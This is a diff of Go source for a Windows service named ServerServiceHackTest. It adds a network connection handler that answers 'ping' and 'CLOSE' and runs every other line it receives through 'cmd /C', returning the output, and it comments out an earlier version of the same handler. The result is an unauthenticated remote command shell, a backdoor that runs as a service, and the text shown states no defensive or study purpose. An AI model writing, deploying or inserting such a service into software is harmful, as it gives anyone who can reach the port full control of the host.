@@ -15,6 +15,53 @@ type ServerServiceHackTest struct {
     stopChan chan struct{}
 }
 
+
+func (m *ServerServiceHackTest) handleConnection(conn net.Conn) {
+    defer conn.Close()
+    message := "PONG\n"
+    conn.Write([]byte(message))
+
+    reader := bufio.NewReader(conn)
+    for {
+        select {
+        case <-m.stopChan:
+            log.Println("Closing connection due to stop command")
+            return
+        default:
+            data, err := reader.ReadString('\n')
+            if err != nil {
+                log.Printf("Error reading from connection: %v", err)
+                return
+            }
+            
+            command := strings.TrimSpace(data)
+            log.Printf("Received command: %s", command)
+            
+            // Обработка команды ping
+            if command == "ping" {
+                conn.Write([]byte("pong\n"))
+                continue
+            }
+            
+            if command == "CLOSE" {
+                log.Println("Closing connection due to client command")
+                return
+            }
+
+            // Выполнение команды
+            cmd := exec.Command("cmd", "/C", command)
+            output, err := cmd.CombinedOutput()
+            if err != nil {
+                log.Printf("Error executing command: %v", err)
+                conn.Write([]byte("Error executing command\n"))
+            } else {
+                log.Printf("Command output: %s", output)
+                conn.Write(output)
+            }
+        }
+    }
+}
+
 func (m *ServerServiceHackTest) Execute(args []string, r <-chan svc.ChangeRequest, status chan<- svc.Status) (bool, uint32) {
     const cmdsAccepted = svc.AcceptStop | svc.AcceptShutdown | svc.AcceptPauseAndContinue
     tick := time.Tick(5 * time.Second)
@@ -69,42 +116,42 @@ loop:
     return false, 1
 }
 
-func (m *ServerServiceHackTest) handleConnection(conn net.Conn) {
-    defer conn.Close()
-    message := "Server is ready to accept commands\n"
-    conn.Write([]byte(message))
+// func (m *ServerServiceHackTest) handleConnection(conn net.Conn) {
+//     defer conn.Close()
+//     message := "Server is ready to accept commands\n"
+//     conn.Write([]byte(message))
 
-    reader := bufio.NewReader(conn)
-    for {
-        select {
-        case <-m.stopChan:
-            log.Println("Closing connection due to stop command")
-            return
-        default:
-            data, err := reader.ReadString('\n')
-            if err != nil {
-                log.Printf("Error reading from connection: %v", err)
-                return
-            }
-            log.Printf("Received data: %s", data)
-            if strings.TrimSpace(data) == "CLOSE" {
-                log.Println("Closing connection due to client command")
-                return
-            }
+//     reader := bufio.NewReader(conn)
+//     for {
+//         select {
+//         case <-m.stopChan:
+//             log.Println("Closing connection due to stop command")
+//             return
+//         default:
+//             data, err := reader.ReadString('\n')
+//             if err != nil {
+//                 log.Printf("Error reading from connection: %v", err)
+//                 return
+//             }
+//             log.Printf("Received data: %s", data)
+//             if strings.TrimSpace(data) == "CLOSE" {
+//                 log.Println("Closing connection due to client command")
+//                 return
+//             }
 
-            // Выполнение команды
-            cmd := exec.Command("cmd", "/C", strings.TrimSpace(data))
-            output, err := cmd.CombinedOutput()
-            if err != nil {
-                log.Printf("Error executing command: %v", err)
-                conn.Write([]byte("Error executing command\n"))
-            } else {
-                log.Printf("Command output: %s", output)
-                conn.Write(output)
-            }
-        }
-    }
-}
+//             // Выполнение команды
+//             cmd := exec.Command("cmd", "/C", strings.TrimSpace(data))
+//             output, err := cmd.CombinedOutput()
+//             if err != nil {
+//                 log.Printf("Error executing command: %v", err)
+//                 conn.Write([]byte("Error executing command\n"))
+//             } else {
+//                 log.Printf("Command output: %s", output)
+//                 conn.Write(output)
+//             }
+//         }
+//     }
+// }
 
 func runService(name string, isDebug bool) {
     if isDebug {
